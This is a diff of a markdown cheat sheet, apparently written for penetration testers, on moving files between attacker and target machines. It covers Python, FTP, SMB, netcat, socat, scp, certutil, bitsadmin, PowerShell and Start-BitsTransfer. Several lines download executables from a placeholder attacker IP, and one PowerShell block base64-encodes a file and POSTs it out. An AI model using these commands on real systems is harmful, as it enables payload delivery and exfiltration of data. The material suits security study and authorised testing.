@@ -8,8 +8,6 @@ has_toc: false
 
 {% include toc.html %}
 
-Ports `80` and `443` are a good starting point.
-
 ## Local web server
 ```
 // Python 2
@@ -28,6 +26,7 @@ See [this link](https://floatingoctothorpe.uk/2017/receiving-files-over-http-wit
 curl -X PUT -T file-to-upload http://<IP>:<port>/
 ```
 
+<br />
 
 ## Local FTP server
 ```
@@ -36,6 +35,8 @@ python3 -m pyftpdlib
 python3 -m pyftpdlib --interface=172.x.x.x -p4433
 python3 -m pyftpdlib --interface=172.x.x.x -p4433 -username=user --password='pass' --directory=tools/ --verbSMB server
 ```
+
+<br />
 
 ## Local SMB server
 ```
@@ -46,6 +47,8 @@ sudo impacket-smbserver -username user -password pass -smb2support Shared tools/
 // Sudo not required for higher port, this proves troublesome for Windows though.
 impacket-smbserver -username user -password pass -port 4343 -smb2support Shared tools/
 ```
+
+<br />
 
 ## Netcat
 Note there are multiple implementations of Netcat: netcat, ncat and nc to name a few.
@@ -60,6 +63,8 @@ nc -lp 4343 > file.out
 nc -lp 4343 | uncompress > file.out
 ```
 
+<br />
+
 ## Socat
 ```
 // On sender.
@@ -68,6 +73,8 @@ socat -u FILE:file.in TCP:10.x.x.x:4343
 // On receiver.
 socat -u TCP-LISTEN:4343 OPEN:file.out,creat,trunc
 ```
+
+<br />
 
 ## Secure Copy
 Assumes ssh access.
@@ -88,6 +95,24 @@ scp -r /local/folder/ user@10.x.x.x /local/folder/
 // Copy remote file to remote target.
 scp from-user@10.x.x.x:/source/folder/ to-user@10.y.y.y:/dest/folder/ 
 ```
+
+<br />
+
+## Windows certutil.exe
+```
+// Windows wget equivalent.
+certutil -urlcache -f http://10.x.x.x:port/file.ext outfile.exe
+```
+
+<br />
+
+## Windows BITS
+```
+// Download resource from web server or SMB share.
+bitsadmin /transfer n http://10.x.x.x:443/file.exe C:\Users\Public\Downloads\file.exe
+```
+
+<br />
 
 ## PowerShell
 ### DownloadString
@@ -121,17 +146,26 @@ $data = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\Dow
 Invoke-WebRequest -Uri http://10.x.x.x:80 -Method POST -Body $data
 ```
 
-## Windows certutil.exe
+### Start-BitsTransfer
 ```
-// Windows wget equivalent.
-certutil -urlcache -f http://10.x.x.x:port/file.ext outfile.exe
+// Import the module.
+Import-Modile bitstransfer
+
+// Download.
+Start-BitsTransfer -Source "http://10.x.x.x/file.exe" -Destination "C:\Users\Public\Downloads\file.exe"
+
+// Upload (check the available options for this).
+Start-BitsTransfer "C:\Users\Public\Downloads\file.exe" -Destination "http://10.x.x.x/file.exe" -TransferType Upload
 ```
 
-## Windows BITS
+### Windows Misc
 ```
-// Download resource from web server or SMB share.
-bitsadmin /transfer n http://10.x.x.x:443/file.exe C:\Users\Public\Downloads\file.exe
+// Test for the following aliases:
+curl
+wget 
 ```
+
+<br />
 
 ## Evil-WinRM
 ```
@@ -143,5 +177,5 @@ bitsadmin /transfer n http://10.x.x.x:443/file.exe C:\Users\Public\Downloads\fil
 ```
 
 ## Misc
-If you have a shell, conver them to `base64` and copy/paste between windows.
+If you have a shell and the files are small, you can convert them to `base64` and copy/paste between windows.
 
